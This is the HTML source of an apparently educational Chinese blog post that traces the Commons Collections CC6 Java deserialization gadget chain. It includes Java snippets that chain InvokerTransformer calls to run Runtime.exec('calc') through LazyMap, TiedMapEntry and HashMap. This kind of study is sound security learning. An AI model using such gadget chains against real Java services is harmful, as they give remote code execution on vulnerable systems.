@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CC6调用链cc6就是cc1+urldns链的结合 1HashMap.readObject-&gt;TiedMapEntry.hashcode-&gt;TiedMapEntry.getvalue-&gt;LazyMap.get-&gt;InvokerTransformer.transform()  我们知道CC1中用了lazymap如下面的例子 12345678910111213141516171">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC6">
+<meta property="og:url" content="https://dgxddd.github.io/2024/04/01/CC6/">
+<meta property="og:site_name" content="jxdgx">
+<meta property="og:description" content="CC6调用链cc6就是cc1+urldns链的结合 1HashMap.readObject-&gt;TiedMapEntry.hashcode-&gt;TiedMapEntry.getvalue-&gt;LazyMap.get-&gt;InvokerTransformer.transform()  我们知道CC1中用了lazymap如下面的例子 12345678910111213141516171">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124171414118.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124180759319.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124181038129.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124191645154.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124192003350.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124192423856.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124201150279.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124202207756.png">
+<meta property="og:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124202803490.png">
+<meta property="article:published_time" content="2024-04-01T12:31:50.000Z">
+<meta property="article:modified_time" content="2026-05-25T12:32:29.932Z">
+<meta property="article:author" content="jxdgx">
+<meta property="article:tag" content="CC链">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124171414118.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+        
+      
+    
+    <!-- title -->
+    <title>CC6 | jxdgx</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+<!-- mathjax -->
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$','$']],
+        displayMath: [['$$','$$'], ['\[','\]']]
+      }
+    });
+  </script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr is-post-page">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/07/10/HW%E6%8A%80%E6%88%98%E6%B3%951/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/03/27/CC1-LazyMap/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2024/04/01/CC6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2024/04/01/CC6/&text=CC6"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2024/04/01/CC6/&is_video=false&description=CC6"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CC6&body=Check out this article: https://dgxddd.github.io/2024/04/01/CC6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2024/04/01/CC6/&title=CC6"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2024/04/01/CC6/&name=CC6&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2024/04/01/CC6/&t=CC6"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CC6%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">CC6调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-getvalue%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">TiedMapEntry#getvalue的调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-hashcode"><span class="toc-number">1.2.</span> <span class="toc-text">TiedMapEntry#hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-hashcode"><span class="toc-number">1.3.</span> <span class="toc-text">HashMap#hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3hash-%E6%96%B9%E6%B3%95%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.</span> <span class="toc-text">解决hash()方法提前触发</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CC6
+    </h1>
+
+
+
+      <div class="meta meta-post">
+        
+    <div class="postdate">
+      
+        <time datetime="2024-04-01T12:31:50.000Z" class="dt-published" itemprop="datePublished">2024-04-01</time>
+        
+      
+    </div>
+
+
+        
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a>
+    </div>
+
+
+        
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CC%E9%93%BE/" rel="tag">CC链</a>
+    </div>
+
+
+      </div>
+    </header>
+    
+
+    <div class="content e-content" itemprop="articleBody">
+      <h1 id="CC6调用链"><a href="#CC6调用链" class="headerlink" title="CC6调用链"></a>CC6调用链</h1><p>cc6就是cc1+urldns链的结合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject-&gt;TiedMapEntry.hashcode-&gt;TiedMapEntry.getvalue-&gt;LazyMap.get-&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<p>我们知道CC1中用了lazymap如下面的例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 1. 获取 Runtime 类对象，这是执行系统命令的基础</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 2. 反射调用 Runtime.class 的 getMethod 方法，获取 getRuntime 方法对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 3. 反射调用 getRuntime 方法（静态方法，所以第一个参数是 null），获取 Runtime 实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 4. 反射调用 Runtime 实例的 exec 方法，执行 &quot;calc&quot; 命令</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将这些 Transformer 串联起来，形成一个执行链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        decorate.get(<span class="string">&quot;222&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>后面我们要看到谁调用了这个get方法</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124171414118.png" alt="image-20251124171414118"></p>
+<h2 id="TiedMapEntry-getvalue的调用"><a href="#TiedMapEntry-getvalue的调用" class="headerlink" title="TiedMapEntry#getvalue的调用"></a>TiedMapEntry#getvalue的调用</h2><p>最后我们在<font color='orange'>TiedMapEntry</font>类中的getValue方法中调用了get，我们就将map赋值为LazyMap的对象就可以进行调用了</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124180759319.png" alt="image-20251124180759319"></p>
+<p>我们写出代码测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 1. 获取 Runtime 类对象，这是执行系统命令的基础</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 2. 反射调用 Runtime.class 的 getMethod 方法，获取 getRuntime 方法对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 3. 反射调用 getRuntime 方法（静态方法，所以第一个参数是 null），获取 Runtime 实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 4. 反射调用 Runtime 实例的 exec 方法，执行 &quot;calc&quot; 命令</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将这些 Transformer 串联起来，形成一个执行链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="keyword">new</span> <span class="title class_">String</span>());</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后我们发现可以进行弹窗</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124181038129.png" alt="image-20251124181038129"></p>
+<p>我们现在查看谁调用了getValue后面我们发现</p>
+<h2 id="TiedMapEntry-hashcode"><a href="#TiedMapEntry-hashcode" class="headerlink" title="TiedMapEntry#hashcode"></a>TiedMapEntry#hashcode</h2><p>发现在同一个类中的<font color='orange'>hashcode</font>中进行了调用了getvalue</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124191645154.png" alt="image-20251124191645154"></p>
+<p>这个时候我们直接修改代码调用hashcode()就行了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 1. 获取 Runtime 类对象，这是执行系统命令的基础</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 2. 反射调用 Runtime.class 的 getMethod 方法，获取 getRuntime 方法对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 3. 反射调用 getRuntime 方法（静态方法，所以第一个参数是 null），获取 Runtime 实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 4. 反射调用 Runtime 实例的 exec 方法，执行 &quot;calc&quot; 命令</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将这些 Transformer 串联起来，形成一个执行链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="keyword">new</span> <span class="title class_">String</span>());</span><br><span class="line">        tiedMapEntry.hashCode();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行会进行弹出计算机</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124192003350.png" alt="image-20251124192003350"></p>
+<p>这个时候我们来进行查找谁调用了hashcode我们在hashmap中发现了</p>
+<h2 id="HashMap-hashcode"><a href="#HashMap-hashcode" class="headerlink" title="HashMap#hashcode"></a>HashMap#hashcode</h2><p>但是静态方法我们不能调用，我们要找到的是一个可以使用的hashcode然后将key传入TiedMapEntry</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124192423856.png" alt="image-20251124192423856"></p>
+<p>其中hash方法没有被public方法修饰，我们这个时候发现在<font color='orange'>readObject</font>中使用了<font color='orange'>hash</font>函数</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124201150279.png" alt="image-20251124201150279"></p>
+<p>当反序列化后会调用<font color='orange'>readObject</font>只需要创建一个HashMap对象，然后序列化即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 1. 获取 Runtime 类对象，这是执行系统命令的基础</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 2. 反射调用 Runtime.class 的 getMethod 方法，获取 getRuntime 方法对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 3. 反射调用 getRuntime 方法（静态方法，所以第一个参数是 null），获取 Runtime 实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 4. 反射调用 Runtime 实例的 exec 方法，执行 &quot;calc&quot; 命令</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将这些 Transformer 串联起来，形成一个执行链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="keyword">new</span> <span class="title class_">String</span>());</span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是我们运行发现没有序列化也进行了弹出计算器</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124202207756.png" alt="image-20251124202207756"></p>
+<p>这个时候我们看了 hashMap.put中没有进行反序列化的时候就发现调用了hash</p>
+<p><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/image-20251124202803490.png" alt="image-20251124202803490"></p>
+<h2 id="解决hash-方法提前触发"><a href="#解决hash-方法提前触发" class="headerlink" title="解决hash()方法提前触发"></a>解决hash()方法提前触发</h2><p><font color='orange'>tiedMapEntry</font>对象在<font color='orange'>put</font>方式放入<font color='orange'>hashMap</font>对象时，使<font color='orange'>tiedMapEntry</font>对象中的内容不完整，进而不让最终的代码触发。</p>
+<p><font color='orange'>put</font>完成之后，通过反射再将<font color='orange'>tiedMapEntry</font>对象中的内容修改完整。</p>
+
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CC6%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">CC6调用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-getvalue%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">TiedMapEntry#getvalue的调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TiedMapEntry-hashcode"><span class="toc-number">1.2.</span> <span class="toc-text">TiedMapEntry#hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap-hashcode"><span class="toc-number">1.3.</span> <span class="toc-text">HashMap#hashcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3hash-%E6%96%B9%E6%B3%95%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91"><span class="toc-number">1.4.</span> <span class="toc-text">解决hash()方法提前触发</span></a></li></ol></li></ol>
+      </div>
+    </aside>
+  
+</div>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
